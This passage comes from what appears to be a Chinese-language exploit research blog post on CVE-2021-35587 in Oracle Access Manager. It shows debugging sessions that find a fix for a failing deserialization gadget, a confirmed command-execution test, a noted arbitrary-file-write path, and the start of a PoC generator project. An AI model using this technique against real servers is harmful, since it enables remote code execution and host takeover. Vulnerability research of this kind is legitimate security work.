</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-84-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-84-53>53</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *Remotable*
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.RemotableSupport
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.RemotableSupport$$Lambda$143/386686148
</span></span><span style=display:flex><span>com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:4<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>360</span> ms.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc -d com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> class-info        com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> code-source       /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span> name              com.tangosol.internal.util.invoke.Remotable
</span></span><span style=display:flex><span> isInterface       true
</span></span><span style=display:flex><span> isAnnotation      false
</span></span><span style=display:flex><span> isEnum            false
</span></span><span style=display:flex><span> isAnonymousClass  false
</span></span><span style=display:flex><span> isArray           false
</span></span><span style=display:flex><span> isLocalClass      false
</span></span><span style=display:flex><span> isMemberClass     false
</span></span><span style=display:flex><span> isPrimitive       false
</span></span><span style=display:flex><span> isSynthetic       false
</span></span><span style=display:flex><span> simple-name       Remotable
</span></span><span style=display:flex><span> modifier          abstract,interface,public
</span></span><span style=display:flex><span> annotation
</span></span><span style=display:flex><span> interfaces        com.tangosol.io.SerializationSupport
</span></span><span style=display:flex><span> super-class
</span></span><span style=display:flex><span> class-loader      +-PolicyClassLoader <span style=color:#e6db74>&#39;weblogic-launcher&#39;</span> @16267862 <span style=color:#f92672>{</span>file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... <span style=color:#f92672>(</span><span style=color:#ae81ff>798</span> more<span style=color:#f92672>)}</span>
</span></span><span style=display:flex><span>                     +-sun.misc.Launcher$AppClassLoader@18b4aac2
</span></span><span style=display:flex><span>                       +-sun.misc.Launcher$ExtClassLoader@495ae1c3
</span></span><span style=display:flex><span> classLoaderHash   <span style=color:#ae81ff>16267862</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> class-info        com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span> code-source       /u01/oracle/coherence/lib/coherence.jar
</span></span><span style=display:flex><span> name              com.tangosol.internal.util.invoke.lambda.AbstractRemotableLambda
</span></span><span style=display:flex><span> isInterface       false
</span></span><span style=display:flex><span> isAnnotation      false
</span></span><span style=display:flex><span> isEnum            false
</span></span><span style=display:flex><span> isAnonymousClass  false
</span></span><span style=display:flex><span> isArray           false
</span></span><span style=display:flex><span> isLocalClass      false
</span></span><span style=display:flex><span> isMemberClass     false
</span></span><span style=display:flex><span> isPrimitive       false
</span></span><span style=display:flex><span> isSynthetic       false
</span></span><span style=display:flex><span> simple-name       AbstractRemotableLambda
</span></span><span style=display:flex><span> modifier          abstract,public
</span></span><span style=display:flex><span> annotation
</span></span><span style=display:flex><span> interfaces        com.tangosol.internal.util.invoke.Remotable,com.oracle.common.base.CanonicallyNamed,java.io.Serializable
</span></span><span style=display:flex><span> super-class       +-java.lang.Object
</span></span><span style=display:flex><span> class-loader      +-PolicyClassLoader <span style=color:#e6db74>&#39;weblogic-launcher&#39;</span> @16267862 <span style=color:#f92672>{</span>file:/home/oracle/arthas/arthas-agent.jar file:/u01/oracle/wlserver/server/lib/weblogic-launcher.jar ... <span style=color:#f92672>(</span><span style=color:#ae81ff>798</span> more<span style=color:#f92672>)}</span>
</span></span><span style=display:flex><span>                     +-sun.misc.Launcher$AppClassLoader@18b4aac2
</span></span><span style=display:flex><span>                       +-sun.misc.Launcher$ExtClassLoader@495ae1c3
</span></span><span style=display:flex><span> classLoaderHash   <span style=color:#ae81ff>16267862</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:2<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>79</span> ms.
</span></span></code></pre></td></tr></table></div></div><p>但是为何类加载器就是找不到呢？实在费解。</p><h4 id=尝试使用arthas添加自定义类>尝试使用arthas添加自定义类<a hidden class=anchor aria-hidden=true href=#尝试使用arthas添加自定义类>#</a></h4><p>此时的我有些懵，甚至怀疑是不是 <code>pers.neo.test</code> 类在服务端没有定义导致的，想尝试使用arthas添加一个类。</p><p>经过搜索，发现 <a href=https://arthas.aliyun.com/doc/en/retransform.html>retransform</a> 命令可以做到，但尝试了没有成功，报错</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-85-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-85-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *pers.neo*
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:0<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>30</span> ms.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ retransform /tmp/test.class 
</span></span><span style=display:flex><span>These classes are not found in the JVM and may not be loaded: <span style=color:#f92672>[</span>pers.neo.test<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>arthas@181<span style=color:#f92672>]</span>$ sc *pers.neo*
</span></span><span style=display:flex><span>Affect<span style=color:#f92672>(</span>row-cnt:0<span style=color:#f92672>)</span> cost in <span style=color:#ae81ff>29</span> ms.
</span></span></code></pre></td></tr></table></div></div><p>文档说是有限制</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-86-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-86-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-86-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-86-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>New field/method is not allowed
</span></span><span style=display:flex><span>The function that is running, no exit can not take effect, such as the new System.out.println added below, only the run() function will take effect.
</span></span></code></pre></td></tr></table></div></div><p>转念想到既然在本地，在依赖库齐全的情况下，不需要pers.neo.test类也是可以完成反序列化的，说明序列化数据中已经包含了所有需要的信息，顺利的情况下通过字节码足以完全还原 <code>pers.neo.test</code> 类了。</p><h4 id=本地远程demo对比>本地远程demo对比<a hidden class=anchor aria-hidden=true href=#本地远程demo对比>#</a></h4><p>在 weblogic.utils.classloaders.ChangeAwareClassLoader#findClass 下断点</p><p>本地是能找到这个interface的</p><p><img loading=lazy src=image-20220326173253221.png alt=image-20220326173253221></p><p>远程的会报错</p><p><img loading=lazy src=image-20220326173439938.png alt=image-20220326173439938></p><p>虽然不知道为何如此，但事实就是如此，远程的classloader找不到这个类。</p><h4 id=尝试调试oamms容器中的defineclass过程>尝试调试oamms容器中的defineClass过程<a hidden class=anchor aria-hidden=true href=#尝试调试oamms容器中的defineclass过程>#</a></h4><p>既然本地成功了，而远程不行，加上网上有人认为defineclass出错可能是version不对，只好再硬着头皮仔细调试oamms容器中那个进进出出native层的defineClass过程。</p><p>在 com.tangosol.internal.util.invoke.RemotableSupport#defineClass 下断点跟进。</p><h5 id=比对abclass数组是否一致一致>比对abClass数组是否一致：一致<a hidden class=anchor aria-hidden=true href=#比对abclass数组是否一致一致>#</a></h5><p>环境中的defination</p><p><img loading=lazy src=image-20220630212626700.png alt=image-20220630212626700></p><p>生成payload时候的defination</p><p><img loading=lazy src=image-20220630212813631.png alt=image-20220630212813631></p><p>看起来是一模一样的。取出其中的 oamms反序列化时的 definition.m_abClass和 生成payload时的constructor.m_definition.m_abClass，他们俩都是1545字节长，但直接计算.hashCode值不同。计算哈希值比较。</p><p>通过evaluate执行</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-87-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-87-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-87-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-87-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>new java.math.BigInteger(1,java.security.MessageDigest.getInstance(&#34;MD5&#34;).digest(constructor.m_definition.m_abClass)).toString(16)
</span></span><span style=display:flex><span>new java.math.BigInteger(1,java.security.MessageDigest.getInstance(&#34;MD5&#34;).digest(abClass)).toString(16)
</span></span></code></pre></td></tr></table></div></div><p>前者都是bce0f353100a294f763a2d72e6a91ff9，是一样的。</p><h5 id=没有将字节码写到磁盘中但存在跨路径写文件>★没有将字节码写到磁盘中，但存在跨路径写文件<a hidden class=anchor aria-hidden=true href=#没有将字节码写到磁盘中但存在跨路径写文件>#</a></h5><p>com.tangosol.internal.util.invoke.RemotableSupport#defineClass</p><p><img loading=lazy src=image-20220630215821723.png alt=image-20220630215821723></p><p>这里的DUMP_REMOTABLE配置来自于 <code>coherence.server.remotable.dumpClasses</code> ，是null。</p><p><img loading=lazy src=image-20220713201632871.png alt=image-20220713201632871></p><p>如果非空的话，会把它作为目录将我们的字节码写入该目录下的class文件中。</p><p><img loading=lazy src=image-20220713202237312.png alt=image-20220713202237312></p><p>因为 coherence.server.remotable.dumpClasses 没有专门配置目录</p><p><img loading=lazy src=image-20220630215859283.png alt=image-20220630215859283></p><p>所以跳过了 com.tangosol.internal.util.invoke.ClassDefinition#dumpClass 写class文件的逻辑。</p><p>但如果进入这个逻辑，这里是可以向任意路径写任意内容文件的。</p><p><img loading=lazy src=image-20220630215632273.png alt=image-20220630215632273></p><h5 id=进入defineclass>进入defineClass<a hidden class=anchor aria-hidden=true href=#进入defineclass>#</a></h5><p>然后就来到了非常梦幻且重要的地方</p><p><img loading=lazy src=image-20220630220226094.png alt=image-20220630220226094></p><p>失败就发生在这个方法里面</p><p>preDefinaClass和defineClassSourceLocation都正常</p><p><img loading=lazy src=image-20220630221107046.png alt=image-20220630221107046></p><p>然后到了native， java.lang.ClassLoader#defineClass1</p><p><img loading=lazy src=image-20220630220925641.png alt=image-20220630220925641></p><p>马上又出来到了 rt.jar的 sun.instrument.InstrumentationImpl#transform</p><p><img loading=lazy src=image-20220630221034001.png alt=image-20220630221034001></p><p>进到 sun.instrument.TransformerManager#transform</p><p><img loading=lazy src=image-20220630221439700.png alt=image-20220630221439700></p><p>transform失败，返回null，为什么呢？类名和bytecode都有了，为什么会transform失败呢？transform究竟发生了什么呢？</p><p><img loading=lazy src=image-20220630222230725.png alt=image-20220630222230725></p><p>transform返回前的调用栈是这样的</p><p><img loading=lazy src=image-20220630222418963.png alt=image-20220630222418963></p><p>F7步进之后变成了</p><p><img loading=lazy src=image-20220630222536486.png alt=image-20220630222536486></p><p>继续F7就来到了AttributeHolder的反序列化过程，一个奇怪的地方，一定是已经跳过了一些其他逻辑，idea没有严格步进。</p><p><img loading=lazy src=image-20220630222849994.png alt=image-20220630222849994></p><h5 id=jump-into-rabbit-hole>jump into rabbit hole<a hidden class=anchor aria-hidden=true href=#jump-into-rabbit-hole>#</a></h5><p>我们需要知道，transform 返回 null之后，attributeHolder报错之前，发生了什么？但native层和Java层的反复横跳实在难以跟踪。</p><p>在 com.tangosol.internal.util.invoke.RemotableSupport#defineClass 下断点</p><p>再根据错误堆栈在classloader的几个地方下断点</p><p><img loading=lazy src=image-20220630223339159.png alt=image-20220630223339159></p><p>分别是在ClassLoader.java的351、418、523行下断点</p><p>在transform 返回一个null的var7之后按F7步进</p><p><img loading=lazy src=image-20220630223419119.png alt=image-20220630223419119></p><p>果然来到了rabbithole，也就是classLoader的351行</p><p><img loading=lazy src=image-20220630223843984.png alt=image-20220630223843984></p><p>这个loadClass 是属于 /root/cwd/cveplay/cve-2021-35587/weblogiclib/coherence.jar 里面的com/tangosol/internal/util/invoke/RemotableSupport.class的，因为它extend了ClassLoader</p><p><img loading=lazy src=image-20220630224234638.png alt=image-20220630224234638></p><p>仔细观察RemotableSupport对象。里面甚至有我们之前尝试加载的类，这是怎么回事呢？不清楚，暂时放着。</p><p><img loading=lazy src=image-20220630224631896.png alt=image-20220630224631896></p><p>这个loadClass在尝试加载 com.tangosol.internal.util.invoke.Remotable类</p><p>尝试关闭smart step into，之后再f7，还是没有用，又来到了AttributeHolder报错的地方，这不是我想看到的。</p><p><img loading=lazy src=image-20220630225747401.png alt=image-20220630225747401></p><h5 id=从transform再开始>从transform再开始<a hidden class=anchor aria-hidden=true href=#从transform再开始>#</a></h5><p>到loadClass</p><p><img loading=lazy src=image-20220630230303789.png alt=image-20220630230303789></p><p>手动进入函数定义下断点，再步进，看到是因为 com/tangosol/internal/util/invoke/RemotableSupport.class 调用findLoadedClass寻找com.tangosol.internal.util.invoke.Remotable时返回了null。</p><p><img loading=lazy src=image-20220630230654620.png alt=image-20220630230654620></p><p>或许，这里，就是整个报错的根因了。</p><h5 id=柳暗花明>柳暗花明<a hidden class=anchor aria-hidden=true href=#柳暗花明>#</a></h5><p>现象是理解了，但是，为什么这个classLoader找不到这个明明存在的类呢？虽然这不是一个类，是一个接口，但也应该被加载了啊。</p><p>看报错调用栈第十六行也是 <code>RemotableSupport (com.tangosol.internal.util.invoke)</code> 这个对象调用 <code>defineClass</code> 去寻找 <code>com.tangosol.internal.util.invoke.Remotable</code> 时出错，而<code> RemotableSupport</code> 和 <code>Remotable</code> ` ，明明在同一个包底下，为何一个类能正常执行，却找不到同一个包下的另一个类呢？</p><p><img loading=lazy src=image-20220630231117661.png alt=image-20220630231117661></p><p>多方折腾之后，终于接受了服务端找不到Remotable这个事实。我沉思良久，终于问出那个问题——<strong>那么究竟是为什么我反序列化自己的test类却要去找Remotable类呢？</strong></p><p>答案就是：因为我的test6定义里面实现了这个接口。</p><p><img loading=lazy src=image-20220630231359837.png alt=image-20220630231359837></p><p>我为什么实现这个接口呢？因为在利用CVE-2020-14644的时候必须实现这个接口。那么现在呢？不实现可以吗？</p><p>重新尝试使用一个不实现Remotable接口的test6类进行调试，参考调用栈添加一个断点com.tangosol.internal.util.invoke.RemoteConstructor#readResolve。</p><p>一路跟进反射来到了一个奇怪的地方：</p><p><img loading=lazy src=image-20220630233258313.png alt=image-20220630233258313></p><p>虽然不知道自己在哪里，但是看到了calc 和 touch，说明静态代码被执行了。</p><p><img loading=lazy src=image-20220630233508611.png alt=image-20220630233508611></p><p>从pers.neo.test6执行到了getRuntime</p><p><img loading=lazy src=image-20220630233610066.png alt=image-20220630233610066></p><p>执行到了exec</p><p><img loading=lazy src=image-20220630233931894.png alt=image-20220630233931894></p><p>切割 token</p><p><img loading=lazy src=image-20220630234134359.png alt=image-20220630234134359></p><p>一路跟进exec直到java.lang.UNIXProcess</p><p><img loading=lazy src=image-20220630234644938.png alt=image-20220630234644938></p><p>然后执行的native的forkAndExec</p><p><img loading=lazy src=image-20220630234819779.png alt=image-20220630234819779></p><p><img loading=lazy src=image-20220630235030429.png alt=image-20220630235030429></p><p>改变test6中的命令为 <code>touch /tmp/hackedbyneo</code>，成功执行命令：</p><p><img loading=lazy src=image-20220630235334364.png alt=image-20220630235334364></p><p>就是说去掉 implements Remotable就可以了，那么是不是ClusterMasterRemote也不用实现。确实如此。</p><p><img loading=lazy src=image-20220630235900537.png alt=image-20220630235900537></p><p><img loading=lazy src=image-20220630235839635.png alt=image-20220630235839635></p><p>其实，Serializable接口也不需要。</p><h3 id=from-cve-2020-14644-to-cve-2021-35587>From CVE-2020-14644 to CVE-2021-35587<a hidden class=anchor aria-hidden=true href=#from-cve-2020-14644-to-cve-2021-35587>#</a></h3><p>总的来说，将自定义的恶意类从</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-88-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-88-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>public class test7 implements Remotable, ClusterMasterRemote, Serializable {}
</span></span></code></pre></td></tr></table></div></div><p>改为</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-89-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-89-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>public class test7 implements Serializable {}
</span></span></code></pre></td></tr></table></div></div><p>就解决了最后的障碍。</p><p>很长一段时间，因为Remotable没有找到而迟迟无法成功利用漏洞。差之毫厘，谬之千里，正是此意。</p><p>至此我们就完成了利用CVE-2021-35587这个漏洞从反序列化入口到恶意类静态代码执行的全过程。</p><p>下面看一下如何在真实环境中采用各种姿势利用这个漏洞获取主机控制权限。</p><h1 id=漏洞利用>漏洞利用<a hidden class=anchor aria-hidden=true href=#漏洞利用>#</a></h1><h2 id=新建生成poc的工程>新建生成PoC的工程<a hidden class=anchor aria-hidden=true href=#新建生成poc的工程>#</a></h2><p>在idea中新建一个名为wlsgadget的maven工程。</p><p>为了操作字节码，在pom.xml中添加javassist。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;project</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;modelVersion&gt;</span>4.0.0<span style=color:#f92672>&lt;/modelVersion&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;groupId&gt;</span>org.example<span style=color:#f92672>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;artifactId&gt;</span>wlsgadget<span style=color:#f92672>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;version&gt;</span>1.0-SNAPSHOT<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;dependencies&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;groupId&gt;</span>org.javassist<span style=color:#f92672>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;artifactId&gt;</span>javassist<span style=color:#f92672>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;version&gt;</span>3.20.0-GA<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/dependencies&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/project&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>为了顺利生成PoC，还需要在library中添加 ”远程调试OAM -> ⑤下载依赖包到调试主机“ 中提到的oraclelib、wlfullclient、coherencelib三个依赖。</p><h2 id=genpocjava漏洞利用框架>genpoc.java：漏洞利用框架<a hidden class=anchor aria-hidden=true href=#genpocjava漏洞利用框架>#</a></h2><p>genpoc.java用basicServiceContext的对象包裹一条已知的weblogic利用链（CVE-2021-14644）。</p><p>cve_2021_35587()方法的输入是一个我们构造的恶意类，如rev.class，输出是可以用于触发漏洞的requester参数值，即以下请求报文中的xxxx部分。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-1> 1</a>
